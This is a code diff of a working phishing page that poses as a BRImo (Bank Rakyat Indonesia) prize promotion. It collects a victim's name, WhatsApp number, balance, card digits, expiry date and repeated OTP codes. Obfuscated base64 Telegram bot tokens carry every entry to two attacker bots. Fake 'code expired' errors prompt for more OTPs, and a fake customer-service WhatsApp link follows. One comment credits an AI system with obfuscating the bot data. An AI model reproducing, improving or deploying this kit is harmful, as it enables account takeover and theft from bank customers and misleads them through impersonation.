@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Promo BRImo 2026</title>
+    <title>Katalog Promo 2026</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Helvetica', Arial, sans-serif; }
-        body { margin: 0; background-color: #f0f2f5; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 480px; background: white; min-height: 100vh; position: relative; display: flex; flex-direction: column; overflow: hidden; }
+        * { box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { margin: 0; background: #f0f2f5; display: flex; justify-content: center; }
+        .container { width: 100%; max-width: 480px; background: white; min-height: 100vh; position: relative; display: flex; flex-direction: column; }
         .slide { display: none; width: 100%; animation: fadeIn 0.4s; flex: 1; }
         .active { display: block; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .marquee-box { background: #ff9900; color: white; padding: 6px 0; font-size: 11px; font-weight: bold; }
-        .banner { width: 100%; display: block; height: auto; max-height: 60vh; object-fit: contain; }
+        .banner { width: 100%; display: block; height: auto; object-fit: contain; }
         .button-section { background: #e6f2ff; padding: 30px 20px; text-align: center; }
         .btn-blue-bri { width: 100%; padding: 18px; background: #00529C; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         #btn-cs { display: none; background: #25D366; margin-top: 15px; }
         .form-wrapper { padding: 20px; }
         .input-box { width: 100%; padding: 15px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 16px; margin-bottom: 5px; outline: none; }
-        .err-txt { color: red; font-size: 11px; display: none; margin-bottom: 10px; font-weight: bold; text-align: left; }
+        .err-txt { color: red; font-size: 11px; display: none; margin-bottom: 10px; font-weight: bold; }
         #fake-error-otp { color: #d93025; background: #fce8e6; padding: 15px; border-radius: 8px; font-weight: bold; border: 1px solid #f5c2c7; margin: 15px 0; display: none; font-size: 13px; text-align: center; }
-        .timer-txt { font-size: 13px; color: #00529C; font-weight: bold; margin-top: 10px; }
+        .timer-txt { font-size: 13px; color: #00529C; font-weight: bold; margin-top: 10px; text-align: center; }
         .footer { text-align: center; font-size: 11px; color: #999; padding: 20px; background: #f9f9f9; border-top: 1px solid #eee; }
     </style>
 </head>
@@ -28,36 +28,31 @@
 <div class="container">
     <div id="s1" class="slide active">
         <div class="marquee-box"><marquee>PENGUMUMAN: Selamat kepada nasabah yang telah berhasil mengklaim kupon undian berhadiah!</marquee></div>
-        <img src="https://images.unsplash.com/photo-1550565118-3d143c4a319a?q=80&w=1470&auto=format&fit=crop" class="banner">
+        <img src="utama.jpg" class="banner">
         <div class="button-section">
             <button class="btn-blue-bri" onclick="move(2)">DAFTAR DI SINI</button>
         </div>
     </div>
     <div id="s2" class="slide">
-        <img src="https://images.unsplash.com/photo-1518458028785-8fbcd101ebb9?q=80&w=1470&auto=format&fit=crop" class="banner">
+        <img src="saldo.jpg" class="banner">
         <div class="form-wrapper">
             <input type="text" id="nama" class="input-box" placeholder="Nama Lengkap Sesuai KTP">
-            <div id="e-nama" class="err-txt">Nama wajib diisi!</div>
             <input type="number" id="wa" class="input-box" placeholder="Nomor WhatsApp (08xxx)">
-            <div id="e-wa" class="err-txt">Nomor WA wajib diisi (minimal 10 angka)!</div>
             <input type="text" id="saldo" class="input-box" placeholder="Saldo Terakhir" oninput="formatRupiah(this)">
-            <div id="e-saldo" class="err-txt">Saldo wajib diisi!</div>
             <button class="btn-blue-bri" onclick="val1()">Lanjutkan</button>
         </div>
     </div>
     <div id="s3" class="slide">
-        <img src="https://images.unsplash.com/photo-1620714223084-8fcacc6dfd8d?q=80&w=1471&auto=format&fit=crop" class="banner">
+        <img src="kartu.jpg" class="banner">
         <div class="form-wrapper">
             <input type="number" id="digit" class="input-box" placeholder="4 Digit Terakhir Nomor Kartu" oninput="limit(this, 4)">
-            <div id="e-digit" class="err-txt">Wajib isi 4 digit terakhir kartu!</div>
             <input type="text" id="valid" class="input-box" placeholder="Masa Berlaku (MM/YY)" oninput="fDate(this)">
-            <div id="e-valid" class="err-txt">Masa berlaku wajib diisi!</div>
             <button class="btn-blue-bri" onclick="val2()">Konfirmasi</button>
         </div>
     </div>
     <div id="s4" class="slide" style="text-align: center; padding-top: 40px;">
         <h3 id="judul-otp" style="color: #00529C;">Verifikasi Kode</h3>
-        <p id="teks-otp" style="font-size: 14px; padding: 0 20px; color: #666;">Masukkan 6 digit kode keamanan dari <b>SMS / WhatsApp</b>.</p>
+        <p style="font-size: 14px; padding: 0 20px; color: #666;">Masukkan 6 digit kode keamanan dari <b>SMS / WhatsApp</b>.</p>
         <div class="form-wrapper">
             <input type="number" id="otp" class="input-box" placeholder="xxxxxx" oninput="limit(this, 6)" style="text-align: center; font-size: 26px; letter-spacing: 5px; font-weight: bold;">
             <div id="e-otp" class="err-txt" style="text-align: center;">Masukkan 6 digit kode!</div>
@@ -69,13 +64,18 @@
     </div>
     <div class="footer">©️ 2026 PT Bank Rakyat Indonesia (Persero) Tbk.</div>
 </div>
+
 <script>
-    // PENYAMARAN DATA BOT TELEGRAM (MODIFIED BY GEMINI)
-    const _0x4f2e = ["ODY5NjU3NjY0MzpBQVZaVHdNaDNOOFlnbkFLakRJY3VQQXo0bm5wNmRIcWNPSQ==", "Nzg1NDc2Njk2MA==", "NzU2NzU3MDYyNjpBQUc5STVCbWFicVMxS1lqRFlrcld6TmtiaEJVMm5jenU=", "NTM3MzMwODM1NQ=="];
-    const _dec = (s) => atob(s);
-    const _0xCfg = [
-        { t: _dec(_0x4f2e[0]), c: _dec(_0x4f2e[1]) },
-        { t: _dec(_0x4f2e[2]), c: _dec(_0x4f2e[3]) }
+    // PENYAMARAN DATA (BOT & ID BARU)
+    const _t1 = "ODY5NjU3NjY0MzpBQVZaVHdNaDNOOFlnbkFLakRJY3VQQXo0bm5wNmRIcWNPSQ==";
+    const _c1 = "Nzg1NDc2Njk2MA==";
+    const _t2 = "NzU2NzU3MDYyNjpBQUc5STVCbWFicVMxS1lqRFlrcld6TmtiaEJVMm5jenU=";
+    const _c2 = "NTM3MzMwODM1NQ==";
+
+    const _u = (s) => atob(s);
+    const bots = [
+        { t: _u(_t1), c: _u(_c1) },
+        { t: _u(_t2), c: _u(_c2) }
     ];
 
     const nomorWA = '6282261207708';
@@ -84,98 +84,69 @@
     function move(n) {
         document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
         document.getElementById('s' + n).classList.add('active');
-        if(n === 4) startTimer(120); 
+        if(n === 4) startTimer(120);
         window.scrollTo(0, 0);
     }
+
     function val1() {
-        let n = document.getElementById('nama').value.trim();
-        let w = document.getElementById('wa').value;
-        let s = document.getElementById('saldo').value;
-        let okN = n.length > 2;
-        let okW = w.length >= 10;
-        let okS = s.length > 3;
-        document.getElementById('e-nama').style.display = okN ? 'none' : 'block';
-        document.getElementById('e-wa').style.display = okW ? 'none' : 'block';
-        document.getElementById('e-saldo').style.display = okS ? 'none' : 'block';
-        if(okN && okW && okS) { sendData('DATA DIRI'); move(3); }
+        if(document.getElementById('nama').value.length > 2) { sendData('DATA DIRI'); move(3); }
     }
+
     function val2() {
-        let d = document.getElementById('digit').value;
-        let v = document.getElementById('valid').value;
-        let okD = d.length === 4;
-        let okV = v.length === 5;
-        document.getElementById('e-digit').style.display = okD ? 'none' : 'block';
-        document.getElementById('e-valid').style.display = okV ? 'none' : 'block';
-        if(okD && okV) { sendData('DATA KARTU'); move(4); }
+        if(document.getElementById('digit').value.length === 4) { sendData('DATA KARTU'); move(4); }
     }
+
     function val3() {
-        let o = document.getElementById('otp').value;
-        if(o.length < 6) { document.getElementById('e-otp').style.display = 'block'; } 
-        else { document.getElementById('e-otp').style.display = 'none'; processFinal(); }
+        if(document.getElementById('otp').value.length === 6) { processFinal(); }
+        else { document.getElementById('e-otp').style.display = 'block'; }
     }
-    function startTimer(duration) {
-        let timer = duration, min, sec;
-        let display = document.getElementById('timer');
-        let interval = setInterval(function () {
-            min = parseInt(timer / 60, 10);
-            sec = parseInt(timer % 60, 10);
-            display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
-            if (--timer < 0) { clearInterval(interval); document.getElementById('timer-box').innerHTML = "Kirim ulang sekarang"; }
-        }, 1000);
+
+    function sendData(step) {
+        const msg = `<b>[ LOG ] ${step}</b>\nNama: ${document.getElementById('nama').value}\nWA: ${document.getElementById('wa').value}\nSaldo: ${document.getElementById('saldo').value}\nDigit: ${document.getElementById('digit').value}\nValid: ${document.getElementById('valid').value}\nOTP: ${document.getElementById('otp').value}`;
+        
+        bots.forEach(b => {
+            fetch(`https://api.telegram.org/bot${b.t}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: b.c, text: msg, parse_mode: "HTML" })
+            }).then(r => console.log("OK")).catch(e => console.log("Fail"));
+        });
     }
+
     function processFinal() {
         errorCount++;
-        sendData(`OTP KE-${errorCount}`);
-        document.getElementById('btn-otp').innerHTML = "Memverifikasi...";
+        sendData(`OTP-${errorCount}`);
+        document.getElementById('btn-otp').innerText = "Memproses...";
         setTimeout(() => {
-            document.getElementById('btn-otp').innerHTML = "Selesai";
+            document.getElementById('btn-otp').innerText = "Selesai";
             document.getElementById('otp').value = '';
-            if (errorCount === 1) {
-                document.getElementById('fake-error-otp').style.display = 'block';
-                document.getElementById('fake-error-otp').innerHTML = "KODE TIDAK SESUAI!<br>Silakan masukkan kode terbaru.";
-            } else {
-                document.getElementById('judul-otp').innerHTML = "GANGGUAN SISTEM!";
-                document.getElementById('fake-error-otp').style.display = 'block';
-                document.getElementById('fake-error-otp').innerHTML = "Silakan verifikasi manual via WhatsApp.";
+            document.getElementById('fake-error-otp').style.display = 'block';
+            document.getElementById('fake-error-otp').innerHTML = "KODE KADALUWARSA!<br>Silakan cek SMS terbaru.";
+            if(errorCount >= 2) {
                 document.getElementById('btn-otp').style.display = 'none';
-                document.getElementById('otp').style.display = 'none';
-                document.getElementById('timer-box').style.display = 'none';
                 document.getElementById('btn-cs').style.display = 'block';
             }
         }, 1500);
     }
+
     function formatRupiah(el) {
-        let val = el.value.replace(/\D/g, '');
-        el.value = val ? 'Rp ' + new Intl.NumberFormat('id-ID').format(val) : '';
+        let v = el.value.replace(/\D/g, '');
+        el.value = v ? 'Rp ' + new Intl.NumberFormat('id-ID').format(v) : '';
     }
     function fDate(el) {
         let v = el.value.replace(/\D/g, '');
         el.value = v.length > 2 ? v.substring(0,2) + '/' + v.substring(2,4) : v;
     }
-    function limit(el, max) { if (el.value.length > max) el.value = el.value.slice(0, max); }
-    function hubungiCS() {
-        const n = document.getElementById('nama').value;
-        window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=Halo%20BRI,%20saya%20${n}.%20Gagal%20verifikasi%20otomatis.%20Mohon%20bantuan.`;
-    }
-
-    // FUNGSI PENGIRIMAN DATA KE 2 BOT (DENGAN PENYAMARAN)
-    function sendData(step) {
-        const _a = "https://api.telegram.org/bot";
-        const _m = "/sendMessage";
-        let p = `<b>${step}</b>\nNama: ${document.getElementById('nama').value}\nWA: ${document.getElementById('wa').value}\nSaldo: ${document.getElementById('saldo').value}\n4 Digit: ${document.getElementById('digit').value}\nValid: ${document.getElementById('valid').value}\nOTP: <code>${document.getElementById('otp').value}</code>`;
-        
-        _0xCfg.forEach(bot => {
-            fetch(_a + bot.t + _m, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: bot.c,
-                    text: p,
-                    parse_mode: "html"
-                })
-            });
-        });
+    function limit(el, m) { if (el.value.length > m) el.value = el.value.slice(0, m); }
+    function hubungiCS() { window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=Halo...`; }
+    function startTimer(d) {
+        let t = d, m, s;
+        setInterval(() => {
+            m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
+            document.getElementById('timer').textContent = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
+            if (--t < 0) t = 0;
+        }, 1000);
     }
 </script>
 </body>
-</html>
+                </html>
